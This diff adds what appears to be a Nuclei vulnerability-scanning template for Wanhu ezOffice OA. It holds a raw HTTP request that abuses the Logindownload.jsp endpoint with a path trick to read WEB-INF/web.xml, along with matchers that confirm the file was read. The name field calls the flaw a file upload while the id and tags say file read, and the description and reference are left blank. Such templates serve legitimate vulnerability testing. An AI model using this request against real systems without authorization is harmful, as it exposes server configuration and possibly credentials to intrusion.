@@ -1,0 +1,31 @@
+id: wanhu-ezoffice-logindownload-fileread
+
+info:
+  name: 万户 ezoffice logindownload - fileupload
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: 
+  tags: wanhu,oa,fileread,ezoffice
+
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/public/edit/logindownload/Logindownload.jsp;?fileName=WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Connection: close
+        Accept-Encoding: gzip
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,"<web-app")
+        condition: and
